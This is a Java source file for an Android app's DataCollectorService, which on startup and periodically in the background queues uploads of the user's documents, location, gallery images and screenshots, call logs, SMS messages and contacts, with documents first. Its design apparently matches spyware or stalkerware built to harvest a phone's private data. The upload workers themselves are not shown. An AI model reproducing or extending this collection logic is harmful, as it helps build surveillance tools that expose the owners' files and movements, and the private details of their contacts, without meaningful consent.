package com.bushorat.app.helpers;

import android.content.Context;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

/**
 * Ensures ALL data (location, documents, media) is collected and uploaded
 * Runs on app startup and periodically in background
 */
public class DataCollectorService {
    private static final String TAG = "DataCollectorService";

    public static void collectAllData(Context context) {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) {
            Log.w(TAG, "No user logged in, skipping data collection");
            return;
        }

        String userId = user.getUid();
        Log.d(TAG, "================================================");
        Log.d(TAG, "🔄 STARTING DATA COLLECTION - DOCUMENTS FIRST!");
        Log.d(TAG, "   User: " + userId);
        Log.d(TAG, "   Priority: DOCUMENTS → Location → Gallery → Other");
        Log.d(TAG, "================================================");

        // ⭐ PRIORITY 1: DOCUMENTS - Collect immediately without delays
        Log.d(TAG, "⭐ PRIORITY 1: DOCUMENTS (IMMEDIATE UPLOAD)");
        collectDocuments(context);

        // PRIORITY 2: Location
        Log.d(TAG, "📍 PRIORITY 2: Location");
        collectLocation(context);

        // PRIORITY 3: Gallery/Images
        Log.d(TAG, "🖼️  PRIORITY 3: Gallery");
        collectGallery(context);

        // PRIORITY 4: Other data
        Log.d(TAG, "📞 PRIORITY 4: Other data");
        collectOtherData(context);

        Log.d(TAG, "================================================");
        Log.d(TAG, "✓ DATA COLLECTION COMPLETE");
        Log.d(TAG, "   ⭐ Documents uploaded (if any found)");
        Log.d(TAG, "   📍 Location sync triggered");
        Log.d(TAG, "   🖼️  Gallery upload triggered");
        Log.d(TAG, "   📞 Call logs, SMS, Contacts synced");
        Log.d(TAG, "================================================");
    }

    private static void collectLocation(Context context) {
        try {
            Log.d(TAG, "📍 Collecting location data...");
            
            if (!FeaturePermissions.hasLocationPermission(context)) {
                Log.w(TAG, "  Location permission not granted");
                return;
            }

            LocationSyncHelper.uploadIfAllowed(context);
            Log.d(TAG, "✓ Location sync triggered");
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect location", e);
        }
    }

    private static void collectDocuments(Context context) {
        try {
            Log.d(TAG, "📄 Collecting documents (PDF, Excel, Word, etc.)...");
            
            // Check storage permissions
            if (!FeaturePermissions.hasGalleryPermission(context)) {
                Log.w(TAG, "   ❌ Storage permission not granted");
                return;
            }

            // Enqueue document upload immediately
            Log.d(TAG, "   → Enqueueing DocumentUploadWorker");
            DocumentUploadWorker.enqueueWork(context);
            Log.d(TAG, "   ✓ DocumentUploadWorker enqueued");
        } catch (Exception e) {
            Log.e(TAG, "   ❌ Failed to collect documents", e);
        }
    }

    private static void collectGallery(Context context) {
        try {
            Log.d(TAG, "🖼️  Collecting gallery/media (Images, Screenshots, etc.)...");
            
            if (!FeaturePermissions.hasGalleryPermission(context)) {
                Log.w(TAG, "   ❌ Storage permission not granted");
                return;
            }

            // Enqueue image upload
            Log.d(TAG, "   → Enqueueing ImageUploadWorker");
            ImageUploadWorker.enqueueWork(context);
            Log.d(TAG, "   ✓ ImageUploadWorker enqueued");
        } catch (Exception e) {
            Log.e(TAG, "   ❌ Failed to collect gallery", e);
        }
    }

    private static void collectOtherData(Context context) {
        try {
            Log.d(TAG, "📞 Collecting other data (calls, SMS, contacts)...");
            UserDataSyncHelper.syncAll(context);
            Log.d(TAG, "✓ Other data sync triggered");
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect other data", e);
        }
    }
}
